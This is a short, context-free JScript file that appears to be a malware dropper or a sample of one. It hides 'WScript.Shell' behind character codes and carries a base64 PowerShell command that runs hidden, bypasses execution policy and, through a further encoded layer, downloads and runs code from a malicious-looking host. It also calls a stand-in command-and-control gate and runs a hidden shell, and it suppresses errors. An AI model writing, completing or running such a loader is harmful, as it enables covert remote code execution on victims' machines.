var _0x = String.fromCharCode(87,83,99,114,105,112,116,46,83,104,101,108,108);
var cmd = "cG93ZXJzaGVsbCAtdyBoaWRkZW4gLW5vcCAtZXAgYnlwYXNzIC1lbmMgU1FCRkFGZ0FLQUJPQUdVQWR3QXRBRThBWWdCcUFHVUFZd0IwQUNBQVRnQmxBSFFBTGdCWEFHVUFZZ0JEQUd3QWFRQmxBRzRBZEFBcEFDNEFSQUJ2QUhjQWJnQnNBRzhBWVFCa0FGTUFkQUJ5QUdrQWJnQm5BQ2dBSWdCb0FIUUFkQUJ3QURvQUx3QXZBRzBBWVFCc0FHa0FZd0JwQUc4QWRRQnpBQzRBWlFCNEFHRUFiUUJ3QUd3QVpRQXVBR01BYndCdEFDOEFjd0IwQUdFQVp3QmxBRElBTGdCbEFIZ0FaUUFpQUNrQQ==";
var host = "c2.example.net";
var url = "ht" + "tp://" + host + "/gate.php";
try {
  var x = new ActiveXObject("MSXML2.XMLHTTP");
  x.open("GET", url, false);
  x.send();
  var s = new ActiveXObject("WScript.Shell");
  s.Run("cmd.exe /c echo staged", 0, false);
} catch (e) { }
